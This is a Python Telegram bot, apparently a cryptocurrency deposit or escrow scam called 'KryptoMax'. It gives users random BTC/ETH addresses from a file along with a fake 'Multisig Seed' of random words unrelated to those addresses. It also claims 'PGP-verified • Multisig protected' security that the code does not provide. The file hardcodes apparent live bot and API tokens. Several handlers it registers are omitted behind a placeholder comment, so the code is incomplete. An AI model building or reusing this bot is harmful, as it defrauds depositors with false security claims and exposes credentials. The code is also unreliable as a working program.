from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, Filters
import random
import requests
import time
import os

# === CONFIGURATION ===
BOT_TOKEN = "7415463958:AAFB-KIiUvnStRTKcqxnJTEpFonoWjl9FAA"
BLOCKCYPHER_TOKEN = "b4aa61c7eab349bcb23a897c9734b211"
BTC_ADDRESS_FILE = "btc_addresses.txt"
ETH_ADDRESS_FILE = "eth_addresses.txt"
PGP_KEY_FILE = "pgp.txt"  # New PGP key file
ADMIN_ID = 6190128347

# === Temporary in-memory storage ===
user_states = {}
refund_addresses = {}
withdrawal_requests = {}
user_data = set()

# === PGP Functions ===
def get_pgp_key():
    """Read PGP key from file"""
    try:
        with open(PGP_KEY_FILE, 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"PGP key error: {e}")
        return "PGP key currently unavailable. Contact support."

def pgp_command(update: Update, context: CallbackContext):
    """Handle /pgp command"""
    key = get_pgp_key()
    update.message.reply_text(
        f"🔐 *KryptoMax Official PGP Key*\n\n"
        f"```\n{key}\n```\n\n"
        f"Verify all official communications with this key.",
        parse_mode="Markdown"
    )

# === Seed Phrase Generator ===
def generate_seed_phrase():
    with open("english.txt", "r") as f:
        words = f.read().splitlines()
    return " ".join(random.sample(words, 12))

# === Random Address Loader ===
def get_random_address(filename):
    try:
        with open(filename, "r") as f:
            addresses = [line.strip() for line in f if line.strip()]
        return random.choice(addresses) if addresses else None
    except:
        return None

# === Start Command (Updated) ===
def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    user_data.add(user_id)
    keyboard = [
        [InlineKeyboardButton("💰 Deposit BTC", callback_data='deposit_btc')],
        [InlineKeyboardButton("💰 Deposit ETH", callback_data='deposit_eth')],
        [InlineKeyboardButton("📜 Guide", callback_data='show_guide'),
         InlineKeyboardButton("🔐 PGP Key", callback_data='show_pgp')]  # New button
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "🔒 *KryptoMax Secure Transactions*\n\n"
        "PGP-verified • Multisig protected",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# === Guide ===
def guide(update: Update, context: CallbackContext):
    guide_text = """
📜 *KryptoMax Guide* 🚡

1. /start – Begin
2. Choose BTC or ETH
3. Send deposit to provided address
4. Bot will detect the real TX (via blockchain)
5. Set withdrawal address
6. Set refund address (optional)
7. Complete transaction ✅

🔐 Always verify our PGP key: /pgp
"""
    update.effective_message.reply_text(guide_text, parse_mode="Markdown")

# === Blockchain Polling ===
def check_blockchain_for_tx(address, coin):
    url = f"https://api.blockcypher.com/v1/{'btc/main' if coin == 'btc' else 'eth/main'}/addrs/{address}/full?token={BLOCKCYPHER_TOKEN}"
    try:
        res = requests.get(url)
        data = res.json()
        if 'txs' in data:
            for tx in data['txs']:
                if tx.get('confirmations', 0) > 0:
                    value = tx['total'] / 1e8 if coin == 'btc' else tx['total'] / 1e18
                    return tx['hash'], value, tx['confirmations']
    except Exception as e:
        print("Blockchain check error:", e)
    return None, 0, 0

# === Handle Button Clicks (Updated) ===
def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.answer()

    if query.data == "deposit_btc":
        phrase = generate_seed_phrase()
        btc_address = get_random_address(BTC_ADDRESS_FILE)
        user_states[user_id] = {"coin": "btc", "address": btc_address}
        msg = f"💰 *BTC Deposit Address:* `{btc_address}`\n\n🔐 *Multisig Seed:* `{phrase}`\n\nSend BTC. Auto-detection enabled.\n\nVerify PGP: /pgp"
        query.edit_message_text(msg, parse_mode="Markdown")

    elif query.data == "deposit_eth":
        phrase = generate_seed_phrase()
        eth_address = get_random_address(ETH_ADDRESS_FILE)
        user_states[user_id] = {"coin": "eth", "address": eth_address}
        msg = f"💰 *ETH Deposit Address:* `{eth_address}`\n\n🔐 *Multisig Seed:* `{phrase}`\n\nSend ETH. Auto-detection enabled.\n\nVerify PGP: /pgp"
        query.edit_message_text(msg, parse_mode="Markdown")

    elif query.data == "show_guide":
        guide(update, context)
        
    elif query.data == "show_pgp":  # New handler
        key = get_pgp_key()
        query.edit_message_text(
            f"🔏 *Official Verification Key*\n\n"
            f"```\n{key}\n```\n\n"
            f"Compare with all signed messages from KryptoMax.",
            parse_mode="Markdown"
        )

# ... [rest of your existing functions remain unchanged] ...

# === Main (Updated) ===
def main():
    # Verify PGP file exists
    if not os.path.exists(PGP_KEY_FILE):
        print(f"⚠️ Warning: PGP key file not found at {PGP_KEY_FILE}")

    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("pgp", pgp_command))  # New command
    dp.add_handler(CommandHandler("guide", guide))
    dp.add_handler(CommandHandler("confirm", confirm))
    dp.add_handler(CommandHandler("admin", admin))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
    dp.add_handler(MessageHandler(Filters.regex("^(Users|Deposits|Withdrawals|Refunds)$"), admin_panel_handler))

    print("✅ Bot running with PGP verification")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()